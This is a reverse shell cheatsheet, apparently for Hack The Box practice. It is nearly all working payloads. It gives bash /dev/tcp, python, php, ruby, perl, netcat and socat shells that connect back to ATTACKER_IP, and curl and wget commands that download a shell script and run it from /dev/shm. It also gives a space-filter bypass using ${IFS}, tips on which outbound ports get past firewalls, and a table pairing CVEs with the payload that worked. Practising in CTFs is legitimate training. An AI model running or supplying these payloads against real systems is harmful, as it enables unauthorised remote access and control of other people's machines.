# Reverse Shell Cheatsheet

> **HTB RCE Reference** — Payloads, delivery methods, and full TTY stabilization.
> Use ports **443, 80, or 8080** first — most targets block 9001 outbound.

---

## Listener Setup — Always First

```bash
# Netcat listener
nc -lvnp 9001

# rlwrap listener — arrow keys + history without full stty dance
rlwrap nc -lvnp 9001

# Python HTTP server — serve payloads to target
sudo python3 -m http.server 80
```

---

## Bash Reverse Shells

### Classic — `/dev/tcp` (most reliable, pure bash)
```bash
/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```
> Pure bash — no external tools required. Works on any system with bash ≥ 2.04.
> Confirmed working on: Shocker, Precious, Planning (HTB)

### Exec variant
```bash
bash -c 'exec bash -i &> /dev/tcp/ATTACKER_IP/PORT <&1'
```
> URL-encode `&` as `%26` when sending through Burp Suite.
> Confirmed working on: Precious HTB

### `${IFS}` bypass — space character filter evasion
```bash
bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/ATTACKER_IP/PORT${IFS}0>&1'
```
> `${IFS}` = bash's Internal Field Separator (space/tab/newline).
> Use when the target filters literal space characters in input.

---

## Python Reverse Shells

### Python3 — socket
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Python3 — pty (pre-stabilized, preferred)
```bash
python3 -c 'import pty,socket,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
> Spawns a real PTY inline — still needs `stty` stabilization below for full interactivity.

---

## Other Language Shells

### PHP
```bash
php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```bash
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### Netcat (with `-e` — often stripped from modern nc)
```bash
nc -e /bin/bash ATTACKER_IP PORT
```
> ⚠️ `-e` is stripped from most modern netcat builds. Use bash `/dev/tcp` instead.

---

## Payload Delivery — Drop & Execute Script

### 1. Create `shell.sh` on your machine
```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

### 2. Serve it
```bash
sudo python3 -m http.server 80
```

### 3. Fetch & execute on target

**curl:**
```bash
curl http://ATTACKER_IP/shell.sh -o /dev/shm/shell.sh && bash /dev/shm/shell.sh
```

**wget:**
```bash
wget -q http://ATTACKER_IP/shell.sh -O /tmp/s && bash /tmp/s
```

> `/dev/shm` is writable tmpfs — no disk artifact, no permission issues.
> Two-step (download then execute) is more reliable than inline payloads with complex redirects.

---

## Shell Stabilization — Full TTY (3-Step Method)

After catching a raw shell, it has no job control, `Ctrl+C` kills the connection, and interactive programs like `sudo` or `vim` don't work. Fix it:

### Step 1 — Spawn a PTY on the target
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
If no python3:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# or
script -qc /bin/bash /dev/null
```

### Step 2 — Background the shell, fix your local terminal
```
Ctrl+Z
```
```bash
stty raw -echo; fg
```

### Step 3 — Set terminal size on the target
```bash
export TERM=xterm-256color
stty rows 38 columns 200
```
> Get your exact local dimensions first: run `stty size` in a separate terminal and match them.

---

## Alternative: Socat — Full TTY in One Shot

Best option when socat is available on the target — no stty dance needed.

**Attacker (listener):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:PORT
```

**Target (connect-back):**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```
> Gives a fully interactive TTY immediately. If socat isn't on the target, drop a static binary via your HTTP server.

---

## Quick Reference — Comparison Table

| Method | Requires | TTY | Notes |
|---|---|---|---|
| `bash /dev/tcp` | bash ≥ 2.04 | No (raw) | Most reliable — no deps |
| `nc -e` | netcat with `-e` | No | Often stripped |
| Python3 pty | python3 | Partial | Best one-liner for pre-stabilized |
| socat | socat binary | **Yes** | Best full TTY option |
| rlwrap nc | rlwrap | Partial | Quick arrow key support |

---

## HTB Box → Payload Mapping

| Box | CVE / Vuln | Working Payload |
|---|---|---|
| Precious | CVE-2022-25765 (pdfkit) | bash exec with `%26`, delivered via Burp |
| Shocker | Shellshock (CGI) | bash `/dev/tcp` classic |
| Planning | CVE-2024-9264 (Grafana) | POC script → nc listener |
| Code | Python sandbox escape | python3 socket shell |

---

## Notes

- Always try **port 443** first — outbound 443 is rarely blocked on HTB targets
- `/dev/shm` is the preferred drop location — tmpfs, world-writable, no disk artifact
- After catching a shell, **always stabilize before doing anything** — raw shells are fragile
- When sending payloads through Burp: URL-encode `&` → `%26`, spaces → `+` or `%20`

---

*Reference: [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)*
